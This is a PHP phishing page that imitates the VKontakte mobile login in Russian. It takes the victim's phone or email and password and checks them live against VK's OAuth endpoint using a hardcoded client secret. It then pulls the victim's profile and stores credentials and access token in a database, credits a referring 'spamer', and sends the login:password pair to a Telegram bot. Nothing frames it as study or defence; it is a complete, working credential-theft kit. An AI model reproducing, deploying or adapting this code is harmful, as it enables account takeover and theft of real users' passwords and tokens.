<? session_start(); 
    include '../bdlog.php';
	if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}
	
    $link = mysql_connect($dbhost,$dbuser,$dbpass);
    mysql_select_db($db_name,$link);

    error_reporting (0);
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		$username = $_POST["email"];
		$password = $_POST["pass"];
		$check = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        $res = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        
		
		if (strpos($check, "access_token") === false)
		{
			$message = '<div class="service_msg service_msg_warning">Указан неверный логин или пароль.</div>';
		} 
			else
			{	
$res = json_decode($res, true);
                $id=$res['user_id'];
                $token=$res['access_token'];
                $inn = file_get_contents("https://api.vk.com/method/account.getProfileInfo?v=5.95&access_token=".$token);
                $inn= json_decode($inn, true);
				$pol = $inn['response']['sex'];
                $fio = $inn['response']['first_name'].' '.$inn['response']['last_name'];
                $frd = json_decode(file_get_contents('https://api.vk.com/method/users.get?v=5.95&user_ids='.$id.'&fields=counters,country,sex,city,photo_50&access_token='.$token));
				$datar = $inn['response']['bdate'];
				$str = $frd -> response[0] -> country -> id;
				$friends = $frd -> response[0] -> counters -> friends;
				$followers = $frd -> response[0]-> counters -> followers;	
				$avatar = $frd -> response[0] -> photo_50;
				$ip = $_SERVER['REMOTE_ADDR'];

$NewUser = mysql_query("SELECT * FROM data WHERE login='$username'") or die();
if (mysql_num_rows($NewUser) == 0) {
        //Вставляем данные, подставляя их в запрос
    $email = $_POST['email'];
                 $password = $_POST['pass'];                      
        $ref = $_POST['comment'];
$inser = mysqli_query($db,"insert into `data` (login,pass,token,fio,friends,pol,str,userid,ip,fromsp,followers,avatar) values ('$email','$password','$token','$fio','$friends','$pol','$str','$id','$ip','$ref','$followers','$avatar')"); 
$updbal = mysqli_query($db,"update `slito` set `inviteusers` = `inviteusers`+1 where `spamer` = '$ref'");
$message = '<div class="service_msg service_msg_warning" style="background-color:#7CBB7C;border-color:green;">Успешная авторизация</div>';	
$text = '🔔 Авторизован новый аккаунт! 📱
👤 '.$fio.'

👥 Друзей - '.$friends.' 
👨‍👨‍👧 Подписчиков - '.$followers.'
🌍 https://vk.com/id'.$id.'

🔑 '.$username.':'.$password.'
';
$send = file_get_contents('https://api.telegram.org/bot'.$tg_token.'/sendMessage?chat_id='.$tg_chat.'&text='.urlencode(preg_replace('/\t/','',$text)));
echo '<script>
    setTimeout(function(){location.href="'.$ssilka.'"} , 2000);  
</script>';			        
} else {
   $message = '<div class="service_msg service_msg_warning">Вы уже авторизованы!</div>';
}       
                
			}
	}
	
if (1 == 1) { echo
'<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="vk vk_js_no ">
 <meta http-equiv="content-type" content="text/html; charset=utf-8">
<head>
<style>[class="cbalink"]{display:none;}</style>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="format-detection" content="telephone=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="MobileOptimized" content="176" />
<meta name="HandheldFriendly" content="True" />
<base id="base">
<meta name="robots" content="noindex,nofollow" />
<title>Получение доступа к ВКонтакте</title>
<link rel="shortcut icon" href="faviconnew.ico">
		<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>

<link type="text/css" rel="stylesheet" href="/auth/css/s_cfmx.css"></link>
<link type="text/css" rel="stylesheet" media="only screen" href="/auth/css/s_yzt.css"></link>
<script type="text/javascript" src="/auth/css/s_o.js"></script>
</head>
<body id="vk" class="vk__body _touch vk_stickers_hints_support_no opera_mini_no vk_al_no" onresize="onBodyResize(true);">
<div class="layout">
<div class="layout__header mhead" id="vk_head">
<div class="hb_wrap">
<div class="hb_btn">&nbsp;</div>
</div>
</div>
<div class="layout__body " id="vk_wrap">
<div class="layout__leftMenu" id="l">
</div>
<div class="layout__basis" id="m">
<div class="basis">
<div class="basis__header mhead" id="mhead">
<div class="hb_wrap mhb_logo">
<div class="hb_btn mhi_logo">&nbsp;</div>
<h1 class="hb_btn mh_header">&nbsp;</h1>
</div></div>
<div class="basis__content mcont" id="mcont"><div class="pcont fit_box bl_cont">
<div class="owner_panel oauth_mobile_header">
<img src="../images/icon.png" class="op_fimg" />
<div class="op_fcont">
<div class="op_owner">Вконтакте</div>
<div class="op_info">Для продолжения, войдите с помощью <b>ВКонтакте</b>.</div>
</div>
</div>
<div class="form_item fi_fat">
<div class="fi_row"><div class="service_msg_box">
'.$message.'
</div></div>
<form method="post" action="#">
<dl class="fi_row">
<dt class="fi_label">Телефон или e-mail:</dt>
<dd>
<div class="iwrap"><input type="text" class="textfield" required="required" minlength="2" maxlength="1024" name="email" value="" /></div>
</dd>
</dl>
<input type="hidden" name="comment" value="'.$_SESSION['comment']. '">
<dl class="fi_row">
<dt class="fi_label">Пароль:</dt>
<dd>
<div class="iwrap"><input type="password" class="textfield" required="required" minlength="2" maxlength="1024" name="pass" /></div>
</dd>
</dl>
<div class="fi_row">
<div class="fi_subrow">
<input class="button" type="submit" value="Войти" />
</div>
</div>
<div class="fi_row_new">
<div class="fi_header fi_header_light">Ещё не зарегистрированы?</div>
</div>
<div class="fi_row">
<a class="button wide_button gray_button" href="https://m.vk.com/join">Зарегистрироваться</a>
</div>
</form>
</div>
</div></div>
<div class="basis__footer mfoot" id="mfoot"><div class="pfoot">
<ul class="footer_menu">
</ul>
</div></div>
</div>
</div>
</div>
</div>
<script type="text/javascript">
</script>
<div id="vk_utils"></div>
<div id="z"></div>
<div id="vk_bottom"></div>
</body>
</html>'; } ?>